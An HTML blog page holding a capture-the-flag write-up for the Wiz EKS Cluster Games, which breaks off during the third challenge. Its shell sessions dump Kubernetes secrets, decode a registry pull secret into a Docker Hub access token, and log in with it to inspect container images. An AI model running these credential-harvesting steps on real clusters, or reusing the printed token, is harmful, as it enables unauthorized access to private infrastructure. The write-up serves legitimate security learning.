@@ -1,0 +1,607 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>an4er&#39; blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+    <link rel="shortcut icon" href="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/avatar.jpg" />
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle" src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/avatar.jpg"/>
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        an4er
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    Want to be a Ctfer, Developer, Red Team
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/an5er" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-2">
+        <div class="mb-3">
+            <h3 class="mb-0">WIZ EKS Cluster GamesCTF WriteUp</h3>
+            
+            <small class="text-muted">Published December 7, 2023</small>
+        </div>
+
+        <article>
+            <p><a href="eksclustergames.com">eksclustergames.com</a></p>
+<p>Recommended for chrome</p>
+<h2 id="secret-seeker">Secret Seeker</h2>
+<blockquote>
+<p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>
+</blockquote>
+<p><strong>solver</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl describe secret log-rotate
+</span></span><span style="display:flex;"><span>Name:         log-rotate
+</span></span><span style="display:flex;"><span>Namespace:    challenge1
+</span></span><span style="display:flex;"><span>Labels:       &lt;none&gt;
+</span></span><span style="display:flex;"><span>Annotations:  &lt;none&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type:  Opaque
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>flag:  <span style="color:#ae81ff">52</span> bytes
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get secret log-rotate -o yaml                   
+</span></span><span style="display:flex;"><span>apiVersion: v1
+</span></span><span style="display:flex;"><span>data:
+</span></span><span style="display:flex;"><span>  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>kind: Secret
+</span></span><span style="display:flex;"><span>metadata:
+</span></span><span style="display:flex;"><span>  creationTimestamp: <span style="color:#e6db74">&#34;2023-11-01T13:02:08Z&#34;</span>
+</span></span><span style="display:flex;"><span>  name: log-rotate
+</span></span><span style="display:flex;"><span>  namespace: challenge1
+</span></span><span style="display:flex;"><span>  resourceVersion: <span style="color:#e6db74">&#34;890951&#34;</span>
+</span></span><span style="display:flex;"><span>  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
+</span></span><span style="display:flex;"><span>type: Opaque
+</span></span></code></pre></div><h2 id="registry-hunt">Registry Hunt</h2>
+<blockquote>
+<p>A thing we learned during our research: always check the container registries.</p>
+<p>For your convenience, the <a href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
+</blockquote>
+<p><strong>solver</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get pods
+</span></span><span style="display:flex;"><span>NAME                    READY   STATUS    RESTARTS   AGE
+</span></span><span style="display:flex;"><span>database-pod-2c9b3a4e   1/1     Running   <span style="color:#ae81ff">0</span>          35d
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl describe pod database-pod-2c9b3a4e
+</span></span><span style="display:flex;"><span>Name:         database-pod-2c9b3a4e
+</span></span><span style="display:flex;"><span>Namespace:    challenge2
+</span></span><span style="display:flex;"><span>Priority:     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Node:         ip-192-168-21-50.us-west-1.compute.internal/192.168.21.50
+</span></span><span style="display:flex;"><span>Start Time:   Wed, <span style="color:#ae81ff">01</span> Nov <span style="color:#ae81ff">2023</span> 13:32:05 +0000
+</span></span><span style="display:flex;"><span>Labels:       &lt;none&gt;
+</span></span><span style="display:flex;"><span>Annotations:  kubernetes.io/psp: eks.privileged
+</span></span><span style="display:flex;"><span>              pulumi.com/autonamed: true
+</span></span><span style="display:flex;"><span>Status:       Running
+</span></span><span style="display:flex;"><span>IP:           192.168.12.173
+</span></span><span style="display:flex;"><span>IPs:
+</span></span><span style="display:flex;"><span>  IP:  192.168.12.173
+</span></span><span style="display:flex;"><span>Containers:
+</span></span><span style="display:flex;"><span>  my-container:
+</span></span><span style="display:flex;"><span>    Container ID:   containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af
+</span></span><span style="display:flex;"><span>    Image:          eksclustergames/base_ext_image
+</span></span><span style="display:flex;"><span>    Image ID:       docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
+</span></span><span style="display:flex;"><span>    Port:           &lt;none&gt;
+</span></span><span style="display:flex;"><span>    Host Port:      &lt;none&gt;
+</span></span><span style="display:flex;"><span>    State:          Running
+</span></span><span style="display:flex;"><span>      Started:      Wed, <span style="color:#ae81ff">01</span> Nov <span style="color:#ae81ff">2023</span> 13:32:08 +0000
+</span></span><span style="display:flex;"><span>    Ready:          True
+</span></span><span style="display:flex;"><span>    Restart Count:  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Environment:    &lt;none&gt;
+</span></span><span style="display:flex;"><span>    Mounts:
+</span></span><span style="display:flex;"><span>      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-cq4m2 <span style="color:#f92672">(</span>ro<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Conditions:
+</span></span><span style="display:flex;"><span>  Type              Status
+</span></span><span style="display:flex;"><span>  Initialized       True 
+</span></span><span style="display:flex;"><span>  Ready             True 
+</span></span><span style="display:flex;"><span>  ContainersReady   True 
+</span></span><span style="display:flex;"><span>  PodScheduled      True 
+</span></span><span style="display:flex;"><span>Volumes:
+</span></span><span style="display:flex;"><span>  kube-api-access-cq4m2:
+</span></span><span style="display:flex;"><span>    Type:                    Projected <span style="color:#f92672">(</span>a volume that contains injected data from multiple sources<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    TokenExpirationSeconds:  <span style="color:#ae81ff">3607</span>
+</span></span><span style="display:flex;"><span>    ConfigMapName:           kube-root-ca.crt
+</span></span><span style="display:flex;"><span>    ConfigMapOptional:       &lt;nil&gt;
+</span></span><span style="display:flex;"><span>    DownwardAPI:             true
+</span></span><span style="display:flex;"><span>QoS Class:                   BestEffort
+</span></span><span style="display:flex;"><span>Node-Selectors:              &lt;none&gt;
+</span></span><span style="display:flex;"><span>Tolerations:                 node.kubernetes.io/not-ready:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
+</span></span><span style="display:flex;"><span>                             node.kubernetes.io/unreachable:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
+</span></span><span style="display:flex;"><span>Events:                      &lt;none&gt;
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get pods -o yaml
+</span></span><span style="display:flex;"><span>apiVersion: v1
+</span></span><span style="display:flex;"><span>items:
+</span></span><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: Pod
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      kubernetes.io/psp: eks.privileged
+</span></span><span style="display:flex;"><span>      pulumi.com/autonamed: <span style="color:#e6db74">&#34;true&#34;</span>
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2023-11-01T13:32:05Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: database-pod-2c9b3a4e
+</span></span><span style="display:flex;"><span>    namespace: challenge2
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;897497&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
+</span></span><span style="display:flex;"><span>  spec:
+</span></span><span style="display:flex;"><span>    containers:
+</span></span><span style="display:flex;"><span>    - image: eksclustergames/base_ext_image
+</span></span><span style="display:flex;"><span>      imagePullPolicy: Always
+</span></span><span style="display:flex;"><span>      name: my-container
+</span></span><span style="display:flex;"><span>      resources: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>      terminationMessagePath: /dev/termination-log
+</span></span><span style="display:flex;"><span>      terminationMessagePolicy: File
+</span></span><span style="display:flex;"><span>      volumeMounts:
+</span></span><span style="display:flex;"><span>      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>        name: kube-api-access-cq4m2
+</span></span><span style="display:flex;"><span>        readOnly: true
+</span></span><span style="display:flex;"><span>    dnsPolicy: ClusterFirst
+</span></span><span style="display:flex;"><span>    enableServiceLinks: true
+</span></span><span style="display:flex;"><span>    imagePullSecrets:
+</span></span><span style="display:flex;"><span>    - name: registry-pull-secrets-780bab1d
+</span></span><span style="display:flex;"><span>    nodeName: ip-192-168-21-50.us-west-1.compute.internal
+</span></span><span style="display:flex;"><span>    preemptionPolicy: PreemptLowerPriority
+</span></span><span style="display:flex;"><span>    priority: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    restartPolicy: Always
+</span></span><span style="display:flex;"><span>    schedulerName: default-scheduler
+</span></span><span style="display:flex;"><span>    securityContext: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    serviceAccount: default
+</span></span><span style="display:flex;"><span>    serviceAccountName: default
+</span></span><span style="display:flex;"><span>    terminationGracePeriodSeconds: <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>    tolerations:
+</span></span><span style="display:flex;"><span>    - effect: NoExecute
+</span></span><span style="display:flex;"><span>      key: node.kubernetes.io/not-ready
+</span></span><span style="display:flex;"><span>      operator: Exists
+</span></span><span style="display:flex;"><span>      tolerationSeconds: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    - effect: NoExecute
+</span></span><span style="display:flex;"><span>      key: node.kubernetes.io/unreachable
+</span></span><span style="display:flex;"><span>      operator: Exists
+</span></span><span style="display:flex;"><span>      tolerationSeconds: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    volumes:
+</span></span><span style="display:flex;"><span>    - name: kube-api-access-cq4m2
+</span></span><span style="display:flex;"><span>      projected:
+</span></span><span style="display:flex;"><span>        defaultMode: <span style="color:#ae81ff">420</span>
+</span></span><span style="display:flex;"><span>        sources:
+</span></span><span style="display:flex;"><span>        - serviceAccountToken:
+</span></span><span style="display:flex;"><span>            expirationSeconds: <span style="color:#ae81ff">3607</span>
+</span></span><span style="display:flex;"><span>            path: token
+</span></span><span style="display:flex;"><span>        - configMap:
+</span></span><span style="display:flex;"><span>            items:
+</span></span><span style="display:flex;"><span>            - key: ca.crt
+</span></span><span style="display:flex;"><span>              path: ca.crt
+</span></span><span style="display:flex;"><span>            name: kube-root-ca.crt
+</span></span><span style="display:flex;"><span>        - downwardAPI:
+</span></span><span style="display:flex;"><span>            items:
+</span></span><span style="display:flex;"><span>            - fieldRef:
+</span></span><span style="display:flex;"><span>                apiVersion: v1
+</span></span><span style="display:flex;"><span>                fieldPath: metadata.namespace
+</span></span><span style="display:flex;"><span>              path: namespace
+</span></span><span style="display:flex;"><span>  status:
+</span></span><span style="display:flex;"><span>    conditions:
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:05Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: Initialized
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:08Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: Ready
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:08Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: ContainersReady
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:05Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: PodScheduled
+</span></span><span style="display:flex;"><span>    containerStatuses:
+</span></span><span style="display:flex;"><span>    - containerID: containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af
+</span></span><span style="display:flex;"><span>      image: docker.io/eksclustergames/base_ext_image:latest
+</span></span><span style="display:flex;"><span>      imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
+</span></span><span style="display:flex;"><span>      lastState: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>      name: my-container
+</span></span><span style="display:flex;"><span>      ready: true
+</span></span><span style="display:flex;"><span>      restartCount: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>      started: true
+</span></span><span style="display:flex;"><span>      state:
+</span></span><span style="display:flex;"><span>        running:
+</span></span><span style="display:flex;"><span>          startedAt: <span style="color:#e6db74">&#34;2023-11-01T13:32:08Z&#34;</span>
+</span></span><span style="display:flex;"><span>    hostIP: 192.168.21.50
+</span></span><span style="display:flex;"><span>    phase: Running
+</span></span><span style="display:flex;"><span>    podIP: 192.168.12.173
+</span></span><span style="display:flex;"><span>    podIPs:
+</span></span><span style="display:flex;"><span>    - ip: 192.168.12.173
+</span></span><span style="display:flex;"><span>    qosClass: BestEffort
+</span></span><span style="display:flex;"><span>    startTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:05Z&#34;</span>
+</span></span><span style="display:flex;"><span>kind: List
+</span></span><span style="display:flex;"><span>metadata:
+</span></span><span style="display:flex;"><span>  resourceVersion: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d
+</span></span><span style="display:flex;"><span>NAME                             TYPE                             DATA   AGE
+</span></span><span style="display:flex;"><span>registry-pull-secrets-780bab1d   kubernetes.io/dockerconfigjson   <span style="color:#ae81ff">1</span>      35d
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d -o yaml
+</span></span><span style="display:flex;"><span>apiVersion: v1
+</span></span><span style="display:flex;"><span>data:
+</span></span><span style="display:flex;"><span>  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
+</span></span><span style="display:flex;"><span>kind: Secret
+</span></span><span style="display:flex;"><span>metadata:
+</span></span><span style="display:flex;"><span>  annotations:
+</span></span><span style="display:flex;"><span>    pulumi.com/autonamed: <span style="color:#e6db74">&#34;true&#34;</span>
+</span></span><span style="display:flex;"><span>  creationTimestamp: <span style="color:#e6db74">&#34;2023-11-01T13:31:29Z&#34;</span>
+</span></span><span style="display:flex;"><span>  name: registry-pull-secrets-780bab1d
+</span></span><span style="display:flex;"><span>  namespace: challenge2
+</span></span><span style="display:flex;"><span>  resourceVersion: <span style="color:#e6db74">&#34;897340&#34;</span>
+</span></span><span style="display:flex;"><span>  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
+</span></span><span style="display:flex;"><span>type: kubernetes.io/dockerconfigjson
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# crane auth login  -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo docker.io
+</span></span><span style="display:flex;"><span>2023/12/06 16:23:27 logged in via /home/user/.docker/config.json
+</span></span><span style="display:flex;"><span>root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;architecture&#34;</span>:<span style="color:#e6db74">&#34;amd64&#34;</span>,<span style="color:#e6db74">&#34;config&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Env&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;Cmd&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/bin/sleep&#34;</span>,<span style="color:#e6db74">&#34;3133337&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;ArgsEscaped&#34;</span>:true,<span style="color:#e6db74">&#34;OnBuild&#34;</span>:null<span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-11-01T13:32:18.920734382Z&#34;</span>,<span style="color:#e6db74">&#34;history&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-07-18T23:19:33.538571854Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &#34;</span><span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-07-18T23:19:33.655005962Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;/bin/sh -c #(nop)  CMD [\&#34;sh\&#34;]&#34;</span>,<span style="color:#e6db74">&#34;empty_layer&#34;</span>:true<span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-11-01T13:32:18.920734382Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;RUN sh -c echo &#39;wiz_eks_challenge{xxxxx}&#39; \u003e /flag.txt # buildkit&#34;</span>,<span style="color:#e6db74">&#34;comment&#34;</span>:<span style="color:#e6db74">&#34;buildkit.dockerfile.v0&#34;</span><span style="color:#f92672">}</span>,<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;created&#34;</span>:<span style="color:#e6db74">&#34;2023-11-01T13:32:18.920734382Z&#34;</span>,<span style="color:#e6db74">&#34;created_by&#34;</span>:<span style="color:#e6db74">&#34;CMD [\&#34;/bin/sleep\&#34; \&#34;3133337\&#34;]&#34;</span>,<span style="color:#e6db74">&#34;comment&#34;</span>:<span style="color:#e6db74">&#34;buildkit.dockerfile.v0&#34;</span>,<span style="color:#e6db74">&#34;empty_layer&#34;</span>:true<span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;os&#34;</span>:<span style="color:#e6db74">&#34;linux&#34;</span>,<span style="color:#e6db74">&#34;rootfs&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;layers&#34;</span>,<span style="color:#e6db74">&#34;diff_ids&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&#34;</span>,<span style="color:#e6db74">&#34;sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432&#34;</span><span style="color:#f92672">]}}</span>
+</span></span></code></pre></div><h2 id="image-inquisition">Image Inquisition</h2>
+<blockquote>
+<p>A pod&rsquo;s image holds more than just code. Dive deep into  its ECR repository, inspect the image layers, and uncover the hidden  secret.</p>
+<p>Remember: You are running inside a compromised EKS pod.</p>
+<p>For your convenience, the <a href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
+</blockquote>
+<p><strong>solver</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@wiz-eks-challenge:~# kubectl get pods -o yaml
+</span></span><span style="display:flex;"><span>apiVersion: v1
+</span></span><span style="display:flex;"><span>items:
+</span></span><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: Pod
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      kubernetes.io/psp: eks.privileged
+</span></span><span style="display:flex;"><span>      pulumi.com/autonamed: <span style="color:#e6db74">&#34;true&#34;</span>
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2023-11-01T13:32:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: accounting-pod-876647f8
+</span></span><span style="display:flex;"><span>    namespace: challenge3
+</span></span><span style="display:flex;"><span>    resourceVersion: <span style="color:#e6db74">&#34;897513&#34;</span>
+</span></span><span style="display:flex;"><span>    uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
+</span></span><span style="display:flex;"><span>  spec:
+</span></span><span style="display:flex;"><span>    containers:
+</span></span><span style="display:flex;"><span>    - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
+</span></span><span style="display:flex;"><span>      imagePullPolicy: IfNotPresent
+</span></span><span style="display:flex;"><span>      name: accounting-container
+</span></span><span style="display:flex;"><span>      resources: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>      terminationMessagePath: /dev/termination-log
+</span></span><span style="display:flex;"><span>      terminationMessagePolicy: File
+</span></span><span style="display:flex;"><span>      volumeMounts:
+</span></span><span style="display:flex;"><span>      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>        name: kube-api-access-mmvjj
+</span></span><span style="display:flex;"><span>        readOnly: true
+</span></span><span style="display:flex;"><span>    dnsPolicy: ClusterFirst
+</span></span><span style="display:flex;"><span>    enableServiceLinks: true
+</span></span><span style="display:flex;"><span>    nodeName: ip-192-168-21-50.us-west-1.compute.internal
+</span></span><span style="display:flex;"><span>    preemptionPolicy: PreemptLowerPriority
+</span></span><span style="display:flex;"><span>    priority: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    restartPolicy: Always
+</span></span><span style="display:flex;"><span>    schedulerName: default-scheduler
+</span></span><span style="display:flex;"><span>    securityContext: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    serviceAccount: default
+</span></span><span style="display:flex;"><span>    serviceAccountName: default
+</span></span><span style="display:flex;"><span>    terminationGracePeriodSeconds: <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>    tolerations:
+</span></span><span style="display:flex;"><span>    - effect: NoExecute
+</span></span><span style="display:flex;"><span>      key: node.kubernetes.io/not-ready
+</span></span><span style="display:flex;"><span>      operator: Exists
+</span></span><span style="display:flex;"><span>      tolerationSeconds: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    - effect: NoExecute
+</span></span><span style="display:flex;"><span>      key: node.kubernetes.io/unreachable
+</span></span><span style="display:flex;"><span>      operator: Exists
+</span></span><span style="display:flex;"><span>      tolerationSeconds: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    volumes:
+</span></span><span style="display:flex;"><span>    - name: kube-api-access-mmvjj
+</span></span><span style="display:flex;"><span>      projected:
+</span></span><span style="display:flex;"><span>        defaultMode: <span style="color:#ae81ff">420</span>
+</span></span><span style="display:flex;"><span>        sources:
+</span></span><span style="display:flex;"><span>        - serviceAccountToken:
+</span></span><span style="display:flex;"><span>            expirationSeconds: <span style="color:#ae81ff">3607</span>
+</span></span><span style="display:flex;"><span>            path: token
+</span></span><span style="display:flex;"><span>        - configMap:
+</span></span><span style="display:flex;"><span>            items:
+</span></span><span style="display:flex;"><span>            - key: ca.crt
+</span></span><span style="display:flex;"><span>              path: ca.crt
+</span></span><span style="display:flex;"><span>            name: kube-root-ca.crt
+</span></span><span style="display:flex;"><span>        - downwardAPI:
+</span></span><span style="display:flex;"><span>            items:
+</span></span><span style="display:flex;"><span>            - fieldRef:
+</span></span><span style="display:flex;"><span>                apiVersion: v1
+</span></span><span style="display:flex;"><span>                fieldPath: metadata.namespace
+</span></span><span style="display:flex;"><span>              path: namespace
+</span></span><span style="display:flex;"><span>  status:
+</span></span><span style="display:flex;"><span>    conditions:
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: Initialized
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:11Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: Ready
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:11Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: ContainersReady
+</span></span><span style="display:flex;"><span>    - lastProbeTime: null
+</span></span><span style="display:flex;"><span>      lastTransitionTime: <span style="color:#e6db74">&#34;2023-11-01T13:32:10Z&#34;</span>
+</span></span><span style="display:flex;"><span>      status: <span style="color:#e6db74">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>      type: PodScheduled
+</span></span><span style="display:flex;"><span>    containerStatuses:
+</span></span><span style="display:flex;"><span>    - containerID: containerd://c465d5104e6f4cac49da0b7495eb2f7c251770f8bf3ce4a1096cf5c704b9ebbe
+</span></span><span style="display:flex;"><span>      image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
+</span></span><span style="display:flex;"><span>      imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
+</span></span><span style="display:flex;"><span>      lastState: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>      name: accounting-container
+</span></span><span style="display:flex;"><span>      ready: true
+</span></span><span style="display:flex;"><span>      restartCount: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>      started: true
+</span></span><span style="display:flex;"><span>      state:
+</span></span><span style="display:flex;"><span>        running:
+</span></span><span style="display:flex;"><span>          startedAt: <span style="color:#e6db74">&#34;2023-11-01T13:32:11Z&#34;</span>
+</span></span><span style="display:flex;"><span>    hostIP: 192.168.21.50
+</span></span><span style="display:flex;"><span>    phase: Running
+</span></span><span style="display:flex;"><span>    podIP: 192.168.5.251
+</span></span><span style="display:flex;"><span>    podIPs:
+</span></span><span style="display:flex;"><span>    - ip: 192.168.5.251
+</span></span><span style="display:flex;"><span>    qosClass: BestEffort
